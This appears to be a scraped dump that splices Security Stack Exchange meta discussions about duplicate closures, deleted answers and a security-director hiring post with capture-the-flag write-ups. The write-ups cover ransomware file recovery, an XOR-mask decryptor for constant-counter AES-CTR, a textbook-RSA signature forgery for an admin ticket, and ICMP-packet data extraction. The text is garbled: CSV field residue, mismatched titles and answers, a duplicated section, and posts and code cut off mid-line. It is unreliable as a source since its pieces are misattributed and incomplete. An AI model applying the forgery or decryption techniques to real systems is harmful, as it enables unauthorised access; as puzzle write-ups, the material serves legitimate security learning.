<p>The last example is particularly salient because the user is looking for a very specific answer about sha_crypt and being told his question is a ""possible duplicate"" of a long comprehensive page that doesn't even mention his specific hash.  At least one of the users had the courtesy to say ""Welcome on Security SE. You will most likely find your answer in this thread: How to securely hash passwords?, in particular in the area following...""</p>

<p>We shouldn't be counting on every user to do what this user did and modify the auto-comment to explain things. This last example also shows how the use of the term ""possible duplicate"" is not very intuitive or explanatory.  I would recommend we change the auto-comment as you suggest to something like:</p>

<blockquote>
  <p>""This question was possibly answered in... If this question and answers don't
  solve your problem, please clarify to explain the differences in your
  question.""</p>
</blockquote>

<p>This wording avoids all these terse and technical-sounding ""possible duplicate of"" tags on these borderline duplicates.</p>

Badge icons (especially gold) have a vertical offset,"<h2>WannaFly</h2>

<p>(forensics, 100)</p>

<p>We have an image of an ext4 filesystem. It contains some pictures that have been encrypted and blurred by the ransomware WannaFly. Apart from the blurry pictures, there is a Python script called <code>...</code> and a <code>.bash_history</code> file which shows that <code>...</code> was executed with the argument <code>Hb8jnSKzaNQr5f7p</code>.</p>

<p>Looking at the Python script, we see that it transforms each input file in the following way:</p>

<ul>
<li>Load it as an image.</li>
<li>Encrypt the original image using AES-CFB, using the key passed as an argument, and with an IV which is derived from the time.</li>
<li>Blur the image and overlay a bird logo and some text.</li>
<li>Overwrite the original file with the blurred image, a newline and the encrypted image in base64 format.</li>
</ul>

<p>So to recover the original images, we need to extract the part of each file after the last newline, decode it as base64, and decrypt it with the known key and the IV.</p>

<p>The seed for deriving the IV is the current time when the script starts encrypting each file, rounded down to a whole second. That's going to be the timestamp of the file or a little before. The timestamps on the files are less than one second apart on average, so the time seed is likely to be exactly the file's timestamp or one second before.</p>

<h2>Stack Overflow</h2>

<p>(crypto, 100)</p>

<p>We have some broken encryption code in Python with PyCrypto. (<a href=""https://stackoverflow.com/questions/3154998/pycrypto-problem-using-aesctr/3155175#3155175"">Source</a>)</p>

<pre><code>from Crypto.Cipher import AES
...
crypto = AES.new(os.urandom(32), AES.MODE_CTR, counter=lambda: secret) 
</code></pre>

<p>What a badly-designed API — writing broken crypto code shouldn't be <em>that</em> easy! This code is using CTR with a <em>constant</em> counter. This means that there is a 16-byte string <code>m = AES_enc(key, secret)</code> such that each 16-byte block <code>b[i]</code> of the file is encrypted as <code>b[i] xor m</code>. All we have to do to decrypt the file is guess 16 consecutive bytes of it, which will give us the mask to xor with.</p>

<p>We start by guessing that the file begins with <code>%%PDF-1.</code>, which gives us the first 8 bytes of the 16-byte mask. Then look at the partially-decrypted output, find partially-corrupted PDF operators such as <code>/Contents</code>, <code>/MediaBox</code>, etc. and work out the remaining bytes in the mask to rectify those operators.</p>

<pre><code>#!/usr/bin/env perl
use warnings;
use strict;
my $guess1 = ""%PDF-1.3 \n1 0 ob"";
sysread STDIN, $_, 16;
my $mask = $_ ^ $guess1;
do {
    print STDOUT ($_ ^ $mask)
} while (sysread STDIN, $_, 16);

<h2>Secure Login</h2>

<p>(crypto, 200)</p>

<p>There is a server which responds to signed commands. The command we want is 2: “Collect flag”. This command requires a signed ticket whose plaintext starts with <code>ticket:admin|root|</code>.</p>

<p>A signed ticket is generated by encoding the ticket string as an integer $m$ and calculating $m^d \bmod n$ where $d$ is a secret. In other words, this is textbook RSA, and we have the public key only. It's a 2048-bit key with $e=65537$.</p>

<p>We can obtain the signature of messages in two forms:</p>

<ul>
<li>Messages that start with the string <code>ticket:user|</code> and contain another <code>|</code>, using command 1 “Register yourself as a user”.</li>
<li>Messages that start with the byte 0xff, using command 3 “Sign a message”.</li>
</ul>

<p>We want to obtain the signature of a message that starts with <code>ticket:admin|root|</code>, i.e. a message of the form $0x7469636b65743a61646d696e7c726f6f747c \times 2^{8b} + a$ where $a &lt; 2^{8b}$.</p>

<p>Let $u = $<code>ticket:user||</code> and $v = 0xffffffffffffffd3e3bae71d30e6eac5d3ad$. Then $u \times v = $<code>ticket:admin|root|l\xb3\xf0m\xca1\x16I\xe4\x0edS\xcc</code>.</p>

<p>Use command 1 on an empty user name and full name to get $u^d$. Use command 2 on <code>ffffffffffffd3e3bae71d30e6eac5d3ad</code> ($v$ without the leading 0xff) to get $v^d$. Multiply them; the result is</p>

Can I create a new question about recommended password length?,"<p>I'm a bit surprised that the huge number of posts we have on this don't cover it off sufficiently for you. They cover why longer is better than short, the pros and cons of complexity, and the need for the individual to define their risk appetite, as well as when to change passwords, monitoring tools like haveIbeenpwned, and storage of passwords.</p>

<p>I don't think asking a question, ""what length password should I use for Facebook"" would be constructive at all here, because there is still no single answer. The password length and complexity I use for Facebook is probably way longer than I expect yours is. But they are probably both appropriate for each of our needs. Which is why I'd expect a question like that to be closed as a dupe of the same one you mention above.</p>

<p><strong>Hacker from China:</strong><br>
You conclude what every other answer did, that the hack could come from anywhere. You then talk about why you don't like software or web sites from certain countries. Then you re-phrase the question to something you want to talk about, and end with ""No excuses, email vendors. You know who the bad actors are and the painfully obvious way to significantly hamper them.""</p>

<p>That's a rant. And you added nothing as an answer.</p>

<p><strong>Encryption backdoors</strong><br>
A rant about how bad governments can be, which completely misses the point of the question about <em>unintentional</em> access to backdoors by unauthorized parties. You do talk about rogue government employees, but the question specifically mentions them as out of scope for the question.</p>

<p>Again, kind of ranty about 'governments'.</p>

",<discussion>,5,,450
I Misunderstood the question and answered the completely wrong question: should I delete?,"<p>Your highly selective and chopped-up quote from ""Android patching cycles"" doesn't do it justice.</p>

<p>Here's the whole answer, with no edits:</p>

<blockquote>
  <p>I recommend ditching Android and getting a iPhone.</p>
  
  <p>Apple has a much better track record of supporting old iPhones,
  preventing malware/hack attacks against iOS, and booting
  scummy/fake/malicious apps out of the App Store before they cause
  serious damage.</p>
  
  <p>In 2012 I got an official Google Nexus phone because it was on sale
  and I liked having the option to install any app instead of being
  locked into a centralized app store. Instead, the promise of a ""free
  and open"" ecosystem turned into a nightmare in practice. Most app
  developers would include adware or spyware into free (and sometimes
  paid) apps, leaving the end-user with no idea who to trust. I found
  over the years that Google is generally poor at keeping malware out of
  the Google Play store, usually waiting for large numbers of people to
  get infected/compromised and booting out the offending app after a
  massive uproar. 2 years ago, there was a wildly popular
  ""antivirus/antimalware"" app for Android that turned out to be
  nonfunctional.</p>
  
  <p>Over the last 2 years, numerous quality issues and questionable design
  decisions further plagued my experience with both Android and Google
  browser apps - just to name a few: the new Google Hangouts UI removed
  most of the phone calling functionality, repeated ""incoming messages
  may be delayed"" and failure to automatically reconnect, searching in
  Google Hangouts for phone numbers largely doesn't work, my Nexus phone
  would repeatedly receive bad updates causing it to crash often, and
  even simple stuff like the built-in alarm clock app would fail to
  work. Adding insult to injury: I heard that my Nexus phone doesn't
  have an automated option to upgrade to the latest version of Android -
  an upgrade would require a manual sideload (rooting) the phone.</p>
  
  <p>This year, I finally got an iPhone and deprecated my old Google Nexus
  phone.</p>
  
  <p>Also: Android and Linux reportedly get the worst of the recent KRACK
  exploit and some devices may have to wait weeks or months for a patch.
  Microsoft supposedly patched it on Windows a while back, and the
  latest version of iOS 11 fixes it as well.</p>
  
  <p>Open source isn't a magic solution. While code reviews are nice, it's
  also nice to have the funding to afford timely and competent updates.
  Open source only works as far as people are willing to contribute.</p>
  
  <p>Obviously it's dangerous when your device no longer receives updates
  (except if you have some other practices or tools to properly lock it
  down in lieu of updates). If you have time to research code reviews
  and you want to stick with Android variants for some reason then you
  could go with Cyanogen (as Rory Alsop posted).</p>
</blockquote>

<p>Granted, some of it could be considered slightly rant-y. However, there's plenty of useful information in there about why someone should seriously consider ditching Android. At least, consider deleting or editing rant-y parts of it instead of nuking it outright.</p>
",<discussion>,5,,450
I Misunderstood the question and answered the completely wrong question: should I delete?,"<p>To be fair, the original question was totally vague. </p>

<p>I have had a few instances where I spent a long time writing long, detailed answers, only to have the question change underneath me, and I delete. It sucks. </p>

<p>Other times, I have written long answers only to have a Bear post an answer just before I was finished (and then, what's the point, really?)</p>

<p>It's one reason why I am so quick to try to get people to clarify their questions and to make sure they are asking what they think they might be asking. </p>

<p>To keep things in the spirit of on-topic Q&amp;As, I would recommend deleting off topic answers. </p>

<p>But this situation has now changed. You kept the off-topic parts while editing the answer to be on-topic. As there is now an evolving history to both the question and your answer. I think you did the right thing to section off the old part. </p>
",<discussion>,5,,450
I Misunderstood the question and answered the completely wrong question: should I delete?,"<blockquote>
  <p>I will stop contributing answers to this subforum</p>
</blockquote>

<p>This may be the source of your confusion and bad experience - back in the day we used to say <em>this is not a forum</em>. In particular, there are no threads. If you notice (try refreshing the page) answers appear in a random order if they have equal votes with top-voted answers moving to the top. Answers accepted by the asker come above all else.</p>

<p>The idea of the site is that each answer <em>should</em> as best as is possible given the question answer it wholly and completely; the more thoroughly the better. You shouldn't need to read multiple posts or pages of threads to put together what is going on: it should be there, in the accepted answer.</p>

<p>Sometimes questions suck, or are impossible to answer. Going off Schroeder's post, it sounds like you answered a question that might sound like:</p>

<blockquote>
  <p>How does X cyber company know China did it?</p>
</blockquote>

<p>and the answer is basically ""they dont; attribution is hard-to-impossible"". These kinds of questions tend to attract more discussion-y type answers, which might give the appearance of a forum, but the chatter isn't quite in the spirit of the site. We sort of tolerate it because there isn't really a better way to handle the fact some questions just don't have answers, but there it is.</p>

<p>However, this doesn't mean it is OK to post your experience about a handset in 200whenever as an answer to a problem someone faces, because it's not really relevant or interesting. I'm picking on this one example. You did however have some good points (again going of Schroeder's answer):</p>

<ul>
<li>Open nature of the android platform (many manufacturers, questionable-to-non-existent patching policies),</li>
<li>Closed nature of the iPhone platform: better QA on their app store includes.</li>
<li>Apple hardware and API design is superior in terms of security (security coprocessor for touchID etc).</li>
</ul>

<p>If you can back these up with some relevant explanations and links, based on facts, you're making a valid argument and this <em>is</em> an answer (provided of course you answer the question the asker asked). But you have to stick to the facts.</p>

<p>Schroeder has actually done you a favour here. The site has a low quality auto-ban filter completely outside of the control of the moderators that will answer-ban new users who consistently post poor quality answers. Moderators cannot deactivate it for you. By deleting your answers, you have avoided the downvote pile-on and subsequent ban you would have eventually arrived at.</p>

<p>But hey, look. Now you know. You can sit back, read a few popular answers, see how the site works and fit right in. Moderators certainly won't hold it against you - there's far too many users for them to remember any except the most problematic of muppets they have to deal with. If you're passionate about security there's plenty of questions to have a go at answering.</p>
",<discussion>,5,,450
I Misunderstood the question and answered the completely wrong question: should I delete?,"<p>I basically agree with <a href=""https://security.meta.stackexchange.com/a/2815/98538"">schroeders</a> answer, with a minor modification.</p>

<p>When updating the answer, in most cases I would not keep the original answer but instead just edit it out when replacing with a new one (perhaps leaving a comment explaining what I did). The reason for this is that I want to avoid questions having ""history"". It makes it very confusing for visitors who arrive from Google trying to solve a problem. To me, everything that is not ""well formed question"" or ""answer to <em>that</em> question"" is noise.</p>

<p>Sometimes though things are so messy in general that this isn't possible or require more work than it is worth - e.g. if the question itself contains ""history"" then it might be easier to understnad if your answer does as well.</p>
",<discussion>,5,,450
I Misunderstood the question and answered the completely wrong question: should I delete?,"<p>Since you requested comments from more people: I've read through all of the three deleted answers, and I agree with the assessment of the moderator. The judgement the moderator made is the same as any other moderator would (and should) have made, or most users for that matter. Hence there is no one that is harassing you, and there is no need for new control mechanisms. The moderator was just doing their job here - deleting content of a type that it is the community consensus that it does not belong here.</p>

<p>You have recieved plenty of explanations for why the answers were not on topic, both in comments to the answers and here, so I will not develop on that further.</p>
",<discussion>,5,,450
I Misunderstood the question and answered the completely wrong question: should I delete?,"<p>I'm not sure I like the idea of having a canonical dupe target for questions that are inherently off topic. That would sort of signal that those questions are in fact on topic, and I suspect it would cause frustration when people get their questions closed as duplicates to a question that is not specific enough to solve their problem.</p>

<p>I think picking the right close reason is imporant, even for bad questions, and in many cases here ""off topic"" is the correct one, and not ""duplicate"".</p>

<p>There might be a class of questions that are on topic that need a dupe target, but that class does not consist of all newbie Kali questions. So I am not opposed to the idea of a canonical question for Kali in general.</p>

<p>That said, I think this is a good topic that we need to think some about and perhaps do something. Not sure what, though. :-)</p>

Impediment of new questions,"<h2>How big of a problem is this?</h2>

<p>I had trouble finding a large number of examples of dumb tricks to generate passwords.  Could you provide more examples?  Perhaps the problem here is that it's subjective.  I think adding foreign words to diceware or an unprintable character at the end of your password is an interesting proposition to add a small amount of extra security, while other users may say ""just use a password manager to generate a 16-character alphanumeric string"".</p>

<h2>""Dumb"" isn't a closure reason</h2>

<p>As far as I was aware, just because a question is dumb, low-effort, or trivial doesn't mean it should be closed. Realistically, low-effort questions  clog up the site with low-quality content, so there is some merit in closing or <a href=""https://meta.stackexchange.com/questions/5221/how-does-deleting-work-what-can-cause-a-post-to-be-deleted-and-what-does-that"">deleting</a> them. However, none of the closure reasons are directly related to how dumb you think the question is.  That's what a downvote is for, and <a href=""https://gaming.meta.stackexchange.com/questions/5498/a-close-vote-is-not-a-super-downvote-please-dont-use-it-as-one"">a vote to close is not a super-downvote</a>.</p>

<h2>Deciding which password schemes are dumb tricks isn't simple</h2>

<p>You seem to assume that line between naïve passwords and smart passwords is clear, but in many cases there's a big grey area.  Password schemes falling into this grey area will create controversy when you try to close them as a dupe of a ""don't use dumb tricks"" question.</p>

<p>Some examples of questions that fall into the grey area include:</p>

<ul>

</ul>

<h2>The mythical canonical answer</h2>

<p>Every website about passwords tries to develop good explanations of do's and don'ts of password use.  What makes us different is that we have thousands of specific questions and answers, which in a world dominated by Google searches is a very good strategy.   While processes like clearing up duplicates can make it seem like the goal is to have just one canonical question and answer for every topic, in reality we aim to have a variety of similar questions and answers so that users can find the answer easily to their specific question (<a href=""https://stackoverflow.blog/2010/11/16/dr-strangedupe-or-how-i-learned-to-stop-worrying-and-love-duplication/"">source</a>). Closing lots of low-effort questions about basic tricks is a valid goal, but it comes with the caveat that many questions won't be so easy to mark as a duplicate and that's ok.   We're allowed to have several variations of the same question.  </p>

<p>We're not trying to tell people to just go RTFM.  I've seen too many cases on this site of overzealous users who tried to close questions as duplicates of questions that are only tangentially related.  Using vote-to-close as a way to say ""Answering individual questions like yours is too much work, but here's a link to an indirectly-related generic answer that might answer your question"" isn't helpful, it's OCD.</p>

<p>An intermediate solution to this is having a canonical answer for common variations, like adding foreign words, adding part of the website name, using the current year in your password, etc.  We already have this, although many of the answers aren't very good.</p>

<p>Duplicate closures are a tricky subject.  For more see <a href=""https://meta.stackexchange.com/questions/74080/close-as-duplicate-what-if-only-the-answer-is-a-duplicate"">this meta question</a> .</p>

<p>Current questions are not a good candidate for a single canonical answer (these are the only ones I found, please comment any other ideas you have):</p>

<ul>
<li><a href=""https://security.stackexchange.com/questions/6095/xkcd-936-short-complex-password-or-long-dictionary-passphrase"">XKCD #936: Short complex password, or long dictionary passphrase?</a>  is mostly about something else entirely: comparing two specific schemes.  You'd have to read between the lines to understand the point.</li>
<li><a href=""https://security.stackexchange.com/questions/104046/what-type-of-pattern-should-i-use-for-my-passwords/104047#104047"">What type of pattern should I use for my password?</a> Is too succinct to provide the wake-up call you want.  It doesn't even explain the basics of password entropy.</li>
</ul>

<p>Closing new questions like ""is wwwwwwwwwwwwwwww a secure password?"" to any of these questions would be confusing and even potentially rude.</p>

<h2>Picking a recommended password generation scheme is controversial</h2>

<p>Password managers are one of the best solutions, but are a pain for many people.  I have family members that don't lock their phones.  You think you can force them to roll some dice and use a third-party app just to protect their Disqus account? There are also many places they don't work like websites that block copy and paste, hardware like smart TV or videogame systems, public computers, phones under some circumstances, etc.</p>

<p>I've tried to start a question about how long passwords should be, only for the idea to be ""too subjective"" under its most general application, and already covered under more narrow formulations thanks to similar questions like <a href=""https://security.stackexchange.com/questions/69374/is-an-80-bit-password-good-enough-for-all-practical-purposes/69378"">this</a>.  A user in the comments told me a 32-character alphanumeric password would be sufficient for some people but not for others (even though over 90 bits of entropy your password becomes <a href=""https://security.stackexchange.com/questions/168479/expert-quote-on-entropy-for-uncrackable-password/168511"">ridiculously hard to crack</a>).</p>

<p>Various widely accepted systems like diceware and xkcd have been their own source of controversy (see <a href=""https://www.schneier.com/blog/archives/2014/03/choosing_secure_1.html"" rel=""nofollow noreferrer"">Bruce Scheier's criticism</a>).  These widely accepted systems have also seen several extensions, from different separators between words, casing changes, using online generators vs dice, and using foreign words.  </p>

<p>Given all these points of personal opinion, are you really going to tell a user that their idea is dumb and your idea is unequivocally better?</p>

<h2>Standard points that would have to be made in the one-size-fits-all question</h2>

<ul>
<li>Explanation of threat models like brute force, shoulder surfing, plaintext leak, or offline cracking</li>
<li>Advantages and disadvantages of a password manager</li>
<li>Explanation of how entropy is computed as a result of password generation, not just apparent complexity</li>
<li>Discussion of memorability vs guessability tradeoffs.</li>
<li>Ideally, if I have two passwords of yours, it should still be very difficult to guess another password.</li>
<li>Either explain the most common tricks individually like repetition and changing characters, or walk through how to calculate Kerchoff's principle and, discuss where each should be used.</li>
</ul>

<h2>Pros and Cons of redirecting all dumb trick questions to one new canonical one</h2>

<p>Pros:</p>

<ul>
<li>Less redundant information and effort explaining things like why a password manager is good, what entropy is, what the threat scenarios are, how cracking works, why it's hard to outsmart password crackers.</li>
<li>More focus on one good answer to this question rather than hundreds of answers</li>
<li>Leaner site with less clutter</li>
<li>Fewer dumb questions that annoy experts</li>
</ul>

<p>Cons:</p>

<ul>
<li>Reduces unique information for each password question asked, making our answers less useful.</li>
<li>Less Google-friendly design.  Asking ""Does repeating words make my password more secure?"" directs you to a page which redirects you to a lengthy general explanation of password strategies instead of going straight to a targeted answer ""No, password crackers can predict that, you don't really gain anything by repeating words.""  </li>
<li>Would probably result in overzealous behavior, causing good, legitimate questions to be misunderstood and closed.</li>
<li>Can be offensive to the asker who didn't realize their closed question was dumb and now is told their question doesn't belong here and they should have already found the answer.</li>
</ul>

<p>Some unique information can be generated for each password scheme:</p>

<ul>
<li>Is the scheme recommended by any researchers or websites?</li>
<li>How usable is this password scheme?</li>
<li>Is the scheme already covered by common rules in software like hashcat?</li>
<li>Does the scheme seem like nation-state actors might be able to compromise it?</li>
<li>Does the scheme seem likely to be misused, compromising it's security?</li>
</ul>

<p>Even though there are problems with the way it's currently set up, I'd say we keep doing what we're doing.  Creating one canonical answer would probably help these dumb trick questions, but creating a canonical answer would be difficult, deciding which questions to close as dupes of it is controversial, and the askers might still find the redirection to a canonical answer unfriendly and unclear.</p>

New tag request: Insecurity-Questions and Security-Questions,"<p>I think the topic of security questions - e.g. whats your mother maiden name - is distcint enough to merit it's own tag.

<p>The fact that there's already an authentication tag is irrelevant. That tag is huge, and is not a reason for not having more specific tags for sub topics.</p>

"Canonical question for ""where should I store my server side secrets""?","<p>I <em>do</em> think a canonical question would be in order, but I <em>do not</em> think that candidate is fitting. The answers are far too specific to secrets with the specific properties of encryption keys such that editing them to be more general would not be as simple as changing the phrasing. For example, peppers can simply be stored in a file in <code>/etc</code>, since all that matters is that it will not be leaked during an SQLi dump of the database. The candidate you propose, being specific for encryption keys, goes on to say that storing a pepper on the filesystem is next to useless. Likewise typing out a user's authentication token at system boot and storing it in memory makes no sense, unless ""authentication token"" is replaced with ""disk encryption key"". In my opinion:</p>

<ul>
<li>If the question is about where to store a specific bit of <em>sensitive</em> data (but not an encryption key), it should be allowed to exist as its own question. Different questions have different threat models.</li>
<li>If the question is about where to store an <em>encryption key</em>, it should be marked as a duplicate of your candidate. After all, it does explain exactly how to deal with keys.</li>

Request for comment: Stack Overflow is hiring a Director of Information Security,"<p>Your listing seems to imply that the director of information security will respond to the CTO. This may be suboptimal. The CISO, theoretically, should respond only to the CEO and the board. (At least so it says in the CISM manual.)</p>

<p>An enlightening (or not) metaphor is that the CISO is Darth Vader:</p>

<ul>
<li>Springs into action to plug a critical data leak.</li>
<li>Runs from emergency measure to emergency measure throughout a whole movie.</li>
<li>Responds only to the Emperor. Has no clearly defined position in the hierarchy, but still gets to talk at board meetings.</li>
<li>Everybody fears him and hates him.</li>

Request for comment: Stack Overflow is hiring a Director of Information Security,"<p>Personally I like the advert, I think it's positive, quirky enough to gain interest, and has most of the information I would need. However I have a couple of thoughts:</p>

<ul>
<li><strong>Advertising</strong></li>
</ul>

<p>To reach people, I would suggest that SO jobs is not your best bet. Purely because it is so heavily weighted to developer jobs that security folks don't use it. Instead, I would suggest professional networks are the way to go. LinkedIn is an obvious one, and I'm more than happy to share the advert with my network as around 1400 of my contacts are senior security folks [status-completed]. You could also sponsor or attend the odd security event or conference - this is after all where security people go, however different conferences have different audiences, so choosing the right one will be essential.</p>

<p>Another option is the professional headhunter route - pretty effective, and I have used this in the UK, but it is a cost option so perhaps wait until networking fails. </p>

<ul>
<li><strong>Reporting Line</strong></li>
</ul>

<p>Typically, I'd expect the Director of Security in an organisation the size of Stack Exchange to be, in effect, the CISO, as they will have to shoulder the responsibilities and accountability of a CISO, especially as regards the New York State Legislation on named individuals taking responsibility for Cyber Security (currently only mandated for banking, insurance or FS, but likely to spread further). So this role really needs to be a peer of CTO and CRO, or at least able to have a seat at the top table on security decisions, otherwise they will not be empowered at a sufficient level and will still be blamed for failures in security.</p>

<ul>
<li><strong>Location</strong></li>
</ul>

<p>The advert doesn't make it 100% clear that this role could be anywhere. It sounds very US based. Those of us who know Stack Exchange well have seen how well you work across the globe, both remotely and office-based, but I think you could perhaps expand on the non-US possibilities for those who may not be as familiar.  </p>

<ul>
<li><strong>Existing In-House Security Experience</strong></li>
</ul>

<p>Another small thing would be to give an indication of the existing security expertise. While you may not have dedicated security staff, it can be very reassuring to candidates to know what they have to work with. Sure, this can be discussed in interview, but it would be good to know what experience Jarrod, Mark, Geoff etc have in security.</p>

<p>Happy to chat further on any of those on my usual email if you need.</p>

<p>p.s. To solve the Rory issue, just make a renaming ceremony part of the onboarding process :-)</p>

<p>We were provided with a <code>pcapng</code> file. This is a list of packets. After opening it with Wireshark, it displays the following :</p>

<p><a href=""https://i.stack.imgur.com/wpD8J.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/wpD8J.png"" alt=""enter image description here""></a></p>

<p>After some basic search in description, it seems clear that the flag was encoded somewhere.</p>

<p>We can see that some <code>ping</code> get a reply and some don't. So I thought about binary. Maybe when <code>192.241.233.138</code> was replying it meant <code>1</code> and <code>0</code> otherwise. After some digging, it seems that this theory was wrong.
So I kept digging and remarked that <code>ICMP</code> code field was sometimes <code>0</code> and sometimes <code>1</code>. There are no reasons for <code>ICMP</code> to have a code field at <code>1</code> when the type is <code>echo (8)</code>.</p>

<p>I then applied a filter to get only the packets that initiated the ping with <code>ip.src_host==172.26.13.12</code> and exported the selection as plain text. This gave the following :</p>

Appeal for my closed question,"<p><strong>Fuzzy Packets 300</strong></p>

<p>Description</p>

<blockquote>
  <p>Fuzzy loves it when you show love! Can you find it?</p>
</blockquote>

<p>We were provided with a <code>pcapng</code> file. This is a list of packets. After opening it with Wireshark, it displays the following :</p>

<p><a href=""https://i.stack.imgur.com/wpD8J.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/wpD8J.png"" alt=""enter image description here""></a></p>

<p>After some basic search in description, it seems clear that the flag was encoded somewhere.</p>

<p>We can see that some <code>ping</code> get a reply and some don't. So I thought about binary. Maybe when <code>192.241.233.138</code> was replying it meant <code>1</code> and <code>0</code> otherwise. After some digging, it seems that this theory was wrong.
So I kept digging and remarked that <code>ICMP</code> code field was sometimes <code>0</code> and sometimes <code>1</code>. There are no reasons for <code>ICMP</code> to have a code field at <code>1</code> when the type is <code>echo (8)</code>.</p>

<p>I then applied a filter to get only the packets that initiated the ping with <code>ip.src_host==172.26.13.12</code> and exported the selection as plain text. This gave the following :</p>

"Handling ""how can I do [absurdly dangerous thing]"" from someone missing a lot of background knowledge?","<p>In general, I think the best way to deal with these kinds of questions is to try to write good, clear answers that highlight the dangers. Explain that this is extremely dangerous, and how easily things could go wrong. Feel free to use colorful language to get the point across, but don't be rude. </p>

<p>If you offer suggestions for how to mitigate the risk, let them be a minority of the answer. And stress their limitations, and make it painfully clear that your recommendation is to just not do it. The answer to ""how do I shoot myself in the foot"" is ""don't do it"", not ""make sure to have a doctor present"".</p>

<p>A recommendation to leave it to professionals could be appropriate some times, but I don't think it should be the main part of any answer. An answer should educate, not just defer to authority.</p>

Would questions about fictional encyption processes be on-topic here?,"<p>In modern information security, Vignere is broken and therefore irrelevant. The only secure option is to use good ciphers, so this question precludes information security given the current state of the art.</p>

<p>Cryptography probably won't be interested, as these algorithms in general are completely broken. They are of passing historical interest at best. It would be like asking a modern doctors about the balance of humors.</p>

<p>I believe Worldbuilding.SE is the best forum, as there seem to be a lot of technically-minded folks there who are interested in niche and fantastic scenarios. That said, crypto is an uncommon area of interest.</p>

<hr>

<p>I'm have only been on Worldbuilding.SE once or twice, so I could be wrong. Regardless of which forum is ultimately correct, my response would be:</p>

<p>If you use a very long key sequentially---and replace it before you run through it completely---then it is effectively a one-time pad and is very secure. (Provided the new key/pad is distributed securely.)</p>

<p>Each message must indicate where on the pad to begin, otherwise a missing or incomplete message would render subsequent messages indecipherable. Or perhaps you could neglect this issue and let it become a plot point.</p>

<p>For the sake of consistency, your characters should understand that their total biweekly communication cannot exceed the key length. This would add some terseness to the messages and potentially some plot tension if one character needs to communicate as his pad is running out.</p>

<p>If this ""due diligence"" mitigation of Vignere brokenness needs to be overcome, you  have options. The adversary can simply start intercepting and making copies of their pads. Alternatively, the one-time pad may not be truly random, and the adversary could determine how it is created.</p>

<h2>Solution:</h2>

<p>We were given a pcap file and we had to somehow find hidden messages. The statistics tools of wireshark can give some great general insight of the traffic. I usually start from there and view the ""Conversations"", ""Endpoints"" and if there's HTTP traffic, I view the requests. I also try to scroll through the packets very fast and try to see if there's any anomaly:</p>

<p><a href=""https://i.stack.imgur.com/qvKUl.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/qvKUl.png"" alt=""statistics tools""></a></p>

<p>While scrolling through the packets, there were a lot of HTTP traffic. So I viewed the HTTP requests under Statistics:</p>

<p><a href=""https://i.stack.imgur.com/lckMl.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/lckMl.png"" alt=""http requests""></a></p>

<p>Some update/ubuntu/steam related stuff, not very interesting. Moving on to the end of the captured packets, I noticed a stream of (malformed?) ICMP packets:</p>

<p><a href=""https://i.stack.imgur.com/E3TH5.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/E3TH5.png"" alt=""malformed icmp packets""></a></p>

<p>The first ICMP packet had a type of <code>71</code>, the second one had a type of <code>73</code> and the third had a type of <code>70</code>, followed by <code>56</code> and <code>57</code>. Does this sound familiar? :_)</p>

<p><a href=""https://i.stack.imgur.com/CZTA1.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/CZTA1.png"" alt=""ICMP types to chr""></a></p>

<p>There's probably a GIF file hidden in the ICMP packets! Since I didn't want to extract all bytes by hand I wrote a small script with <a href=""https://github.com/KimiNewt/pyshark"" rel=""nofollow noreferrer"">pyshark</a>:</p>



<pre><code>import pyshark

cap = pyshark.FileCapture('./data.pcap', display_filter='icmp')
data = ''

for packet in cap:
    data += chr(int(packet['icmp'].type))

with open('result.gif', 'w') as f:
    f.write(data)
print 'done'
</code></pre>

<p>Unfortunately the GIF file was corrupt and couldn't view it, but it contained <code>lol nice job</code>?!</p>

<p><a href=""https://i.stack.imgur.com/VjLTd.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/VjLTd.png"" alt=""lol nice job""></a></p>

<p>I must be close I thought. After analyzing the packets, I noticed that most of the ICMP packets were sent by <code>Cybertan c8:3d:d4:7a:f3:47</code> but some were sent by Cisco. It turns out that the router/recipient was replying to some of the packets. I decided to filter the packets to only include packets from <code>c8:3d:d4:7a:f3:47</code>:</p>



<pre><code>import pyshark

cap = pyshark.FileCapture('./data.pcap', display_filter='icmp')
data = ''

for packet in cap:
    if packet.eth.src == 'c8:3d:d4:7a:f3:47':
        data += chr(int(packet['icmp'].type))

with open('done.gif', 'w') as f:
    f.write(data)
print 'done'

<p>Has it been days? Weeks? You can't remember how long you've been standing at the door to the vault.
You can't remember the last time you slept
or ate,
or had a drop of water, for that matter.
But all of that is insignificant, in the presence of the untold fortunes that must lie just beyond the threshold.</p>

<p>But the door. It won't budge. It says it will answer only to the DUNGEON_MASTER.
Have you not shown your worth?
But more than that,
It demands to know your secrets.</p>

<p>Nothing you've tried has worked.
You've pled, begged, cursed, but the door holds steadfast, harshly judging your failed requests.</p>

<p>But with each failed attempt you start to notice more and more
that there's something peculiar about the way the door responds to you.</p>

<p>Maybe the door knows more than it's letting on.

<h2>Solution:</h2>

<p>We are presented with a login screen and since this is a web challenge, I tend to use my favourite http proxy: Burp. This allows me to view all traffic received/sent from the webserver. Sending <code>foobar</code> as username and <code>bazqux</code> as password, the UI pops up an alert stating ""invalid credentials"". Burp however intercepted the following response:</p>

<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=""en""&gt;
&lt;head&gt;
&lt;meta charset=""utf-8""&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;No such user: foobar&lt;/pre&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>

<p>There's some JavaScript magic in the webpage that of course handles this. The website and the challenge description both state that only the <code>DUNGEON_MASTER</code> may enter the vault, let's try that as username:</p>

<p><a href=""https://i.stack.imgur.com/PQTj1.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/PQTj1.png"" alt=""only dungeon master may enter""></a></p>

<p>Wrong credentials again but the response was different this time:</p>

<pre><code>&lt;!DOCTYPE html&gt;
&lt;html lang=""en""&gt;
&lt;head&gt;
&lt;meta charset=""utf-8""&gt;
&lt;title&gt;Error&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;pre&gt;test_hash [972c5e1203896784a7cf9dd60acd443a1065e19ad5f92e59a9180c185f065c04]

